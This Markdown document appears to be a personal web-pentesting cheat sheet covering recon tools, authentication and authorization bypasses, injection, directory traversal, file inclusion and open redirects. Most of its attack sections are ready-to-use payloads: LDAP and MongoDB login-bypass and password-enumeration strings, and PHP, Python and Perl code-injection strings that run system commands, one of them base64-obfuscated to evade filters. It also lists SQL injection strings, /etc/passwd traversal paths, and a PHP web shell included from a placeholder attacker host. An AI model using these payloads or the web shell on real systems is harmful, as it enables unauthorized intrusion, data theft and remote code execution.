# Python tips

**[http.client](https://docs.python.org/3/library/http.client.html)** module does not encode urls by itself so it is easier to send params/urls with undecoded characters such as ^.  
```python
import http.client
conn = http.client.HTTPConnection("127.0.0.1", 8080)
conn.set_tunnel("remote-website")
url = "xxxx"
conn.request("GET", url)
r = conn.getresponse()
r.read()
```  

# Misc

## Ruby on Rails
Ruby on Rails lives by **convention** over **configuration**. A lot of a web app code is dynamically generated by Ruby itself to help developers.  
This also means that there are standards which are common to many web applications, with known security problems, and that dynamically created content may slipped from developers control and introduce sensitive information leakage (such as .json version of html file publicly available).

## Code execution

Example, it may be PHP code execution because the user input is inserted into an eval() function, which execute the passed string as a "script".  
Or a regex (find and replace) function which supports (PHP did it in legacy versions) the evalutation of a new value before substitution.

**Warnings** due to "errors" in the syntax do not interrupt code execution.

Pages such as www.example.com/something/something must be tested because most modern frameworks do render url like that. No ? or = helping us to identify the presence of an argument (or possible injection point).  
So, /hello/hacker is /hello?name=hacker or /hello?hacker or /hello=hacker but simply written in a more consice way.  

Same pattern of SQL injection... first try with " and ' to determine if something weird is going on.

## Command execution

Some command executions do not return the output but since no errors are displayed, this behavior means that the execution was successful (blind command execution).  
Tips: sleep() or ping/curl to external (owned) resources.

## Directory traversal

In Windows you will be able to access **test/../../../file.txt**, even if the directory test does not exist.  
This is not the case on Linux.  
This can be really useful where the code concatenates user-controlled data, to create a file name.  
For example, the following PHP code is supposed to add the parameter id to get a file name (example_1.txt for example).

On Linux, you won't be able to exploit this vulnerability if there is no directory starting with example_, whereas on Windows, you will be able to exploit it, even if there is no such directory.

```php
$file = "/var/files/example_".$_GET['id'].".txt";
```

## LFI & RFI

Example of vulnerable url is `/?page=intro.php`.  
Adding a single quote or any other character to _intro.php_ may cause the application to thrown an error leaking useful information.  
If the function **include()** is mentioned in the error means that it is worth investigating deeper for **Local File Inclusion**, **Remote File Inclusion** and **Directory Traversal**.  

## LDAP

In some cases LDAP servers accepts POST (sign-in) request with no arguments. When NULL values are received, LDAP proceeds to bind the connection. The underlying code, such as PHP, will think that the credentials are correct.  
A **Bind** is a connect.  
A **Search** is a query.  
NULL bind connections (username=NULL, password=NULL) are sometimes allowed. 

If you want to add more conditions and some boolean logic to an LDAP string, you can use:

- A boolean OR using |: `(|(cn=[INPUT1])(cn=[INPUT2])) to get records matching [INPUT1] or [INPUT2]`.
- A boolean AND using &: `(&(cn=[INPUT1])(userPassword=[INPUT2]))` to get records for which the cn matches [INPUT1] and the password matches [INPUT2].

LDAP uses the wildcard * character very often, to match any values. This can be used for match everything * or just substrings (for example, adm* for all words starting with adm).

**LDAP supports several formats: {CLEARTEXT}, {MD5}, {SMD5} (salted MD5), {SHA}, {SSHA} (salted SHA1), {CRYPT} for storing passwords.**

## Important CVEs

**php**
- CVE-2008-4096 (phpMyAdmin)


# Recon

Manually collect information about target, looking for domains, IPs, ASNs, fiancial reports... staying in-scope.  

- **bgp.he.net**: information about block IPs/domains. Insert target org name into search >> find related IPs or directly connected ASNs. Some results contain more detailed information than others, pay attention to the **PrefixesV4** pane.
- **ARIN** Whois (or relative to the geographic area of the target location: RIPE, APNIC...)
- **Crunchbase**: free account browsing has a limit of max results per month. Useful to find financial information on acquisitions. Acquisitions are important because big companies tend to acquire (not only invest) other companies, acquiring their IT infrastructure as well. That infrastructure may not be as robust as the main corporate is. In large scoped VDP/BBP, those hidden and not explictily domains from acquisitions may contain important bugs or weaknessses.
- **occrpaleph**: search engine for reportes, files of interest are those related to security, such as **US Sec (CortpWatch)**
- **BuiltWith**: website + Chrome extension. As **Wappalyzer** find technologies used to built the web application, BuiltWith can find those and services running in the background like Google Analytics. The **Relationship** pane list other websites where that piece of technology has already been seen. For example, Google Analytics private code can be used to find other target's domain.   
- **Shodan**: THE search engine to use for passive enumeration of a target
- **Karma v2**: uses a paid Shodan API to find hidden domains and IPs of the target, VPN portals (Favicons section), IPv4 and IPv6 addresses with open ports.
- **Amass**: subdomains passive (and active when some flags are used) enumeration. The more information are passed to it, the more accurate the scan is: domains, IPs or IP blocks, ASNs. A configuration file with APIs is needed to perform efficiently.

# Tools for Out-of-band connections

- **https://webhook.site/**

# Authentication

- **Account registration**
    - **check cookie** for encoded or encrypted credentials (it may help finding the tech used)
    - **register an account** with an already existing account or slightly different name (username retrieval from databases may be case-insensitive):
        - change letters capitalization, ex. Admin (instead of admin)
        - add whitespace(s) at the end of it, ex. "admin "
- **Unhandled redirect**
    - **check 302 HTTP** status code for resources because they might contain sensitive information (due to the web app keep executing)
- **Login bypass**
    - LDAP: remove username and password parameters completely (send POST with no arguments) results in NULL bind
    - LDAP: `GET /?name=admin*))%00&password=whatever` >> `(&(cn=admin*))%00))%00(password=whatever))`

# Authorization

- **Insecure Direct Object Reference**
    - **check for guessable values** in URLs, ex. /infos/1, /infos/2, /infos/3 ...
- **Change Content-type for responses** (access to hidden information)
    - **change Accept header** in requests to get information in different formats (if supported), ex. application/json (instead of text/html, application/xhtml+xml)
    - **add extension to value/id** to access information in different format (if supported), ex. /user/1.json (instead of /user/1(.html))
- **Change user privilege (live/on proxy interception)** in requests such as registration, or info/bio update, ex. user%5Busername%5D=test3&user%5Bpassword%5D=test`&user%5Badmin%5D=true (OR 1)`&submit=Submit (adding relative params to elevate privilege)

# Injection

- ### Code execution/injection (<u>eval functions are bad</u>)
    - **comment out** and insert new code
        - PHP: `//`
        - SQL: `/* */`
        - MySQL: `-- `
        - Some SQL: `#`
        - MongoDB: `%00`,`//`, `<!--`
    - NoSQL:
        - MongoDB:
            - `username=admin' || 1==1 %00&password=whatever&submit=Submit`
            - `username' && this.password%00` (determine if password field exists)
            - `username' && this.password && this.password.match(/.*/)%00` (determine if password does match wildcard)
            - - `username' && this.password && this.password.match(/^[char].*$/)%00` (password enumeration)
    - **concatenation** to inject code:
        - Ruby: `+` >> ``"+`[COMMAND]`+"``
        - PHP: `. +` >> `/?name=".system('id');//"`
        - Python: `+` >> `/hello/hacker"+str(os.popen('id').read())+"`
            - (import module) >> `/hello/hacker"+str(__import__('os').popen('id').read())+"` 
            - (`/` blacklisted) >> `/hello/hacker"+str((__import__('os').popen(__import__('base64').b64decode('[BASE64 ENCODED COMMAND]').decode())).read())+"`
        - Perl: `.` >> ``/cgi-bin/hello?name=hacker'.`id`.'a``
    - **sorting/ordering** exploit:
        - PHP:
            - `/?order=id);}system('whoami');//` - [CVE-2008-4096]
    - **regex search /replace**:
        - PHP
            - `/?new=system('id')&pattern=/replacement/e&base=Hello%20user` (/e modifiers, PHP evaluate new values before performing the substitution)      
    - **legacy functions**
        - PHP
            - _[assert()](https://www.php.net/manual/en/function.assert.php)_: `/?name=hacker'.system('id').'`
- ### Command Execution  
    - Linux:
        - `command1 && command2 that will run command2 if command1 succeeds.`  
        `command1 || command2 that will run command2 if command1 fails.`  
        `command1 ; command2 that will run command1 then command2.`  
        `command1 | command2 that will run command1 and send the output of command1 to command2.`  
        `$(injected command)`  
        `` \`injected command\` ``

- ### SQL Injection
    MySql: 
    ```
    ' OR 1=1 -- 
    ' OR '1'='1
    ' OR '1'='1' -- 
    ') OR 1=1 -- 
    " OR 1=1 -- 
    " OR "1"="1
    " OR "1"="1" -- 
    ") OR 1=1 -- 
    ' OR 1=1 LIMIT 1 -- 
     OR '1'='1' LIMIT 1 -- 
    ') OR 1=1 LIMIT 1 -- 
    ') OR '1'='1' LIMIT 1 -- 
    ```

# Directory traversal

`/file.php?file=file.php`  
`/file.php?file=file.php%00`

`/file.php?file=/hacker.png/../../../../../../../../../../../etc/passwd`  
`/file.php?file=/var/www(!removed >> hacker.png!)/../../../../../../../../../../../etc/passwd`  
`/file.php?file=../../../../../../../../../../../etc/passwd%00`

# LFI & RFI

**remotefile.txt** : 
```php
<?php 
  system($_GET['c']);
?>
___

<?php 

phpinfo();

?>
```
**target php file using include()** :
```
http://<website>/?page=intro.php

>>

/?c=[COMMAND]&page=https://<hackersite>/remotefile.txt 

OR

/?page=https://<hackersite>/remotefile.txt&c=[COMMAND] 
```
**NULL BYTE**
```
http://<website>/?page=intro.php

>>

/?c=[COMMAND]&page=https://<hackersite>/remotefile.txt%00 

OR

/?page=https://<hackersite>/remotefile.txt%00&c=[COMMAND]
```

# Open Redirect

When redirect is forced to start with a `/`, adding the website to redirect to starting with a double `/` bypasses the check.  
// is interpreted as an alias for http:// or https://.

`/redirect.php?url=//www.test.test` == GET / - Host: www.test.test